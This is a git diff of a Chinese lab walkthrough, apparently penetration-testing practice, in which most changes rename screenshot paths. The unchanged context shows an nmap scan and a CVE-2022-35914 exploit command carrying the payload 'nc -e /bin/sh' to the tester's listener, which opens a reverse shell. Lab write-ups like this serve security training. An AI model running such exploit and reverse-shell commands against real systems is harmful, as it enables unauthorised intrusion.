@@ -42,17 +42,17 @@ nmap -sC -sV -p- -oA law 192.168.210.190 --open
 
 <figure><img src="../.gitbook/assets/7.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/8.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/8 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 分别使用dirsearch和gobuster没有扫出来任何文件/目录，推测目标系统中没有这个路径，因此尝试修改脚本中的默认路径为根目录：
 
-<figure><img src="../.gitbook/assets/9.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/9 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/10.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/10 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 此时发现脚本可以成功执行：
 
-<figure><img src="../.gitbook/assets/11.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/11 (1).png" alt=""><figcaption></figcaption></figure>
 
 ### GET SHELL
 
@@ -62,13 +62,13 @@ nmap -sC -sV -p- -oA law 192.168.210.190 --open
 python3 CVE-2022-35914.py -u http://192.168.228.190 -c 'nc -e /bin/sh 192.168.45.161 4444'
 ```
 
-<figure><img src="../.gitbook/assets/12.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/12 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 本机做好监听，即可获得回连的shell：
 
-<figure><img src="../.gitbook/assets/13.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/13 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/14 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/14 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 # 升级shell
